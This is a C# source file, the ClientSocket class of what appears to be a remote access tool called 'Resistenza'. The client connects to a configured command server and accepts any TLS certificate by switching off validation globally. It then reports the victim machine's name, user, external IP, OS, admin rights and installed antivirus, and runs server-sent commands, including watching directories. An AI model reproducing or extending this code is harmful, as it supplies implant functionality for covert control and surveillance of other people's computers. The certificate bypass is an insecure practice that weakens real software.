using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;


using Resistenza.Client.Config;
using System.Net;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using Resistenza.Common.Packets;
using System.Windows.Forms;
using System.Text.Json;

using Resistenza.Common.Networking;
using Resistenza.Client.Utils;
using Microsoft.CSharp.RuntimeBinder;
using Resistenza.Common.Packets.Logic;
using Resistenza.Client.Logic;

namespace Resistenza.Client.Networking
{
    public class ClientSocket
    {
        public bool IsConnected { get; private set; }
        public SecureStream CustomStream;

        private CancellationTokenSource _ReadLoopCancellationToken;
        private CancellationTokenSourceWithId _RemoteOperationTokenSource;
        private TcpClient _TcpClient;

        private readonly SemaphoreSlim _Lock;
        private FileChangeNotifier _FileChangeNotifier;

        public string LastDirRequested { get; set; }
        private bool IsCancellationOperationResponseRequired;



        //public delegate void OnClientRead(object Packet);
        //public event OnClientRead NewPacket;


        private ClientSocket()
        {
            IsConnected = false;
            LastDirRequested = string.Empty;
            _RemoteOperationTokenSource = new CancellationTokenSourceWithId();
            _Lock = new SemaphoreSlim(10);


            
                 
        }

        private static readonly ClientSocket _instance = new ClientSocket();


        private void OnServerConnectionFailure(object sender, EventArgs e)
        {
            IsConnected = false;
            _ReadLoopCancellationToken.Cancel();
            Console.WriteLine("Connection died");
        }
        public static ClientSocket GetInstance()
        {
            return _instance;
        }

        public async Task<bool> ConnectAsync()
        {
            try {

                _TcpClient = new TcpClient();
                _ReadLoopCancellationToken = new CancellationTokenSource();
                await _TcpClient.ConnectAsync(IPAddress.Parse(Config.ClientSettings.Host), Config.ClientSettings.Port);

                if(_TcpClient.Connected == false)
                {
                    return false;
                }

                bool AuthResult = await AuthenticateAsync();

                if (!AuthResult)
                {
                    return false;
                }

                _FileChangeNotifier = new FileChangeNotifier(CustomStream);
                

                return true;
           
                }
            catch (SocketException) { return false; }
            //errore nella risoluzione dns o nella connessione al server, il programma passa al prossimo host

        }

        public static bool ValidateServerCertificate(
              object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
                return true;

          
            Console.WriteLine("Certificate error: {0}", sslPolicyErrors);

            // Do not allow this client to communicate with unauthenticated servers.
            return false;
        }

        private async Task<bool> AuthenticateAsync()
        {
            CustomStream = new SecureStream(_TcpClient.GetStream(),
         certCallback: (sender, certificate, chain, sslPolicyErrors) =>
         {
             if (sslPolicyErrors != System.Net.Security.SslPolicyErrors.None)
             {
                 Console.WriteLine($"SSL validation errors: {sslPolicyErrors}");
             }
             return true; // accetta qualsiasi certificato
         });

            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

            if (await CustomStream.AuthenticateAsClientAsync("Resistenza.Server", null, SslProtocols.Tls12, false))
            {
                ComputerInfoResponse sendComputerInfo = new ComputerInfoResponse()
                {
                    computerName = Environment.MachineName.ToString(),
                    ComputerUsername = Environment.UserName,
                    ipAddress = await MachineInfo.GetExternalIpAsync(),
                    operatingSystem = MachineInfo.GetOs(),
                    isAdmin = MachineInfo.IsAdmin(),
                    Antivirus = MachineInfo.GetAntivirus(),
                    ClientUsername = ClientSettings.Username
                };

                await CustomStream.SendPacketAsync(sendComputerInfo);

                CustomStream.ErrorReadingSocket += CustomStream_OnErrorReadingSocket;
                CustomStream.ErrorWritingSocket += CustomStream_OnErrorWritingSocket;

                return true;
            }

            return false;
               
        }

        private void CustomStream_OnErrorWritingSocket(object? sender, EventArgs e)
        {
            Console.WriteLine("[ERROR] Write socket failed");
            CustomStream.Disconnect();
        }

        private void CustomStream_OnErrorReadingSocket(object? sender, EventArgs e)
        {
            Console.WriteLine("Reading socket error");
            _ReadLoopCancellationToken.Cancel();
        }

        public async Task BeginListeningAsync()
        {

            
            while (!_ReadLoopCancellationToken.IsCancellationRequested)
            {

                //colpo di genio, il deserializzatore fa il cast dell'oggetto nel tipo appropriato, quindi se qui viene ricevuto come dynamic 
                //sarà possibile chiamare il methodo .Handle() comune a tutti i pacchetti Request, motivo per cui non ci deve essere un packet handler
                //che cerca di capire di che tipo è il pacchetto, grande guadagno in termini di performance

                dynamic? newPacket = await CustomStream.ReadPacketAsync();

                switch (newPacket)
                {
                    case null: //pacchetto malformato o qualcosa è andato storto durante la ricezione del pacchetto 
                        continue;
                    case DirectoryDataRequest:
                        if (_FileChangeNotifier.SetDirectoryToMonitor(newPacket.Directory))
                        {
                            _FileChangeNotifier.Start();
                        }
                        
                        break;
                    case CancelRemoteOperationRequest:

                        int TaskId = ((CancelRemoteOperationRequest)newPacket).TaskId;

                        _RemoteOperationTokenSource.Cancel();
                        _RemoteOperationTokenSource.IdOfTaskToBeCancelled = TaskId;

                        if(TaskId == TasksIds.ALL_ACTIONS && _FileChangeNotifier.IsActive)
                        {
                            _FileChangeNotifier.Stop();
                        }
                        
                        
                        continue; //packet will not be handled

                }

                try
                {
                    Task HandleStoppableTask = newPacket.HandleAsync(CustomStream, _RemoteOperationTokenSource, _Lock);
                    Task OnTaskStopped = HandleStoppableTask.ContinueWith( async t =>
                    {
                        await Task.Delay(500);
                        await CustomStream.SendPacketAsync(new CancelRemoteOperationResponse()
                        {
                            TaskId = _RemoteOperationTokenSource.IdOfTaskToBeCancelled
                        });
                        _RemoteOperationTokenSource = new CancellationTokenSourceWithId(); //resetta l'oggetto allo stato inizia
                    }, TaskContinuationOptions.OnlyOnCanceled);
                   
                }
                
                catch (RuntimeBinderException) {
                    
                     Task HandleUnstoppableTask = newPacket.HandleAsync(CustomStream); //è un operazione che non avrebbe senso annullare per la breve durata, ad esempio DirectoryRequest                 
                }
                

            }

            CustomStream.Disconnect();

            return;
            
            
        }

    }
}
